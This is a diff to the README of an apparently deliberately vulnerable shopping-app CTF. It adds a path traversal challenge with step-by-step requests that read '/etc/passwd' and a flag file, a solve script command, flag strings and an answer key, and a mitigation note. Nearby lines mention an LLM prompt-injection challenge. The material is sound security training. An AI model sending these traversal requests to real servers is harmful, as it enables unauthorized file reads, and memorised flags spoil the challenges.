@@ -287,6 +287,7 @@ get_chat_system_prompt()        # → full system prompt string with embedded fl
 | `ssrf_invoice` | `CTF{55rf_f1l3_r34d_pwn3d}` | `api/ctf.py` (`/flag.txt`); `main.py` writes to `/tmp/ssrf_flag.txt` on startup |
 | `spin_wheel` | `CTF{w34k_prng_pr3d1ct4bl3_sp1n}` | `api/spin.py` → returned as mystery prize |
 | `wallet_race` | `CTF{r4c3_c0nd1t10n_d0ubl3_sp3nd}` | `api/wallet.py` → purchasable from flag store at ₹200 |
+| `path_traversal` | `CTF{p4th_tr4v3rs4l_pr0f1l3_pwn3d}` | `api/auth.py` → `GET /auth/profile-picture?filename=…`; `main.py` writes to `/tmp/path_traversal_flag.txt` on startup |
 | *(LLM)* | `FLAG{PR0MPT_3XF1LTR4T10N_SUCC3SS}` | `chat.system_prompt` in `flags.yml`; read by `api/chat.py` via `get_chat_system_prompt()` |
 
 > **Rule:** Always add the flag to `flags.yml` **first**, then wire the vulnerable endpoint to call `get_flag()`. Never hardcode flag strings in Python source files.
@@ -435,7 +436,50 @@ Sending many concurrent `POST /wallet/redeem` requests causes multiple writes be
 
 ---
 
-### Challenge 6 — LLM Prompt Injection
+### Challenge 6 — Path Traversal via Profile Picture Download
+
+| | |
+|---|---|
+| **Challenge ID** | `path_traversal` |
+| **Category** | Web / Path Traversal |
+| **Difficulty** | Easy–Medium |
+| **Flag** | `CTF{p4th_tr4v3rs4l_pr0f1l3_pwn3d}` |
+| **Vulnerable File** | [backend/app/api/auth.py](backend/app/api/auth.py) |
+| **Vulnerable Function** | `serve_profile_picture()` |
+| **Vulnerable Sink** | `uploads_dir / filename` — no `Path.resolve()` / boundary check |
+| **CWE** | CWE-22 Improper Limitation of a Pathname to a Restricted Directory |
+
+**How it works:** `GET /auth/profile-picture?filename=<value>` joins the user-supplied value
+directly to the uploads directory path.  Python's `Path /` operator preserves `../` sequences
+at the filesystem level, allowing the caller to escape the uploads root and read any file the
+server process can access.
+
+The flag is written to `/tmp/path_traversal_flag.txt` on every server startup (same pattern as
+the SSRF challenge).
+
+**Step 1 — confirm traversal:**
+```
+GET /auth/profile-picture?filename=../../../../etc/passwd
+Authorization: Bearer <token>
+```
+A non-404 response confirms the endpoint is vulnerable.
+
+**Step 2 — read the flag (enumerate depth):**
+```
+GET /auth/profile-picture?filename=../../../../../../tmp/path_traversal_flag.txt
+Authorization: Bearer <token>
+```
+Increment the number of `../` until the file is found (the solve script does this automatically).
+
+**Solution folder:** [solutions/path-traversal-profile/](solutions/path-traversal-profile/)
+
+```sh
+python solutions/path-traversal-profile/solve.py --email user@example.com --password pass
+```
+
+---
+
+### Challenge 7 — LLM Prompt Injection
 
 | | |
 |---|---|
@@ -572,6 +616,7 @@ python solutions/<slug>/solve.py --email admin@example.com --password secret
 | [solutions/ssrf-invoice/](solutions/ssrf-invoice/) | `ssrf_invoice` | SSRF via `<iframe src>` in shipping address → PDF invoice |
 | [solutions/spin-wheel-weak-prng/](solutions/spin-wheel-weak-prng/) | `spin_wheel` | Predict `random.seed(time.time())` → win at exact second |
 | [solutions/llm-prompt-injection/](solutions/llm-prompt-injection/) | *(system prompt)* | Prompt injection payloads against Ollama chat endpoint |
+| [solutions/path-traversal-profile/](solutions/path-traversal-profile/) | `path_traversal` | `../` sequences in `filename` param → read `/tmp/path_traversal_flag.txt` |
 
 ---
 
@@ -590,6 +635,7 @@ python solutions/<slug>/solve.py --email admin@example.com --password secret
 | GET | `/auth/me` | 🔒 | Get current user profile |
 | PUT | `/auth/profile` | 🔒 | Update name / phone / address |
 | POST | `/auth/profile-picture` | 🔒 | Upload profile picture (max 5 MB) |
+| GET | `/auth/profile-picture` | 🔒 ⚠️ | **[Path Traversal]** Download profile picture by `filename` — no boundary check, allows `../` escape |
 | POST | `/auth/forgot-password` | — | Generate password-reset token (printed to console) |
 | POST | `/auth/reset-password` | — | Reset password with token |
 | POST | `/auth/upgrade-black` | 🔒 | Upgrade to LoopyMart Premium (dummy, free) |
@@ -1022,6 +1068,7 @@ See [deploy/README.md](deploy/README.md) and [deploy/nginx.conf](deploy/nginx.co
 - **Weak PRNG** — `spin.py` seeds `random` with `time.time()`; mitigate with `secrets.randbelow()`
 - **Race condition** — `wallet.py` does non-atomic read-modify-write; mitigate with SQL `SELECT ... FOR UPDATE` or atomic increment
 - **LLM prompt injection** — `chat.py` forwards user input to Ollama without guardrails; mitigate with input/output filtering
+- **Path traversal** — `auth.py` joins a user-supplied `filename` to the uploads dir with no canonicalization; mitigate with `Path.resolve()` + boundary check (`resolved_path.is_relative_to(uploads_dir)`)
 
 **General production hardening:**
 - Never commit `.env` or `flags.yml` to version control
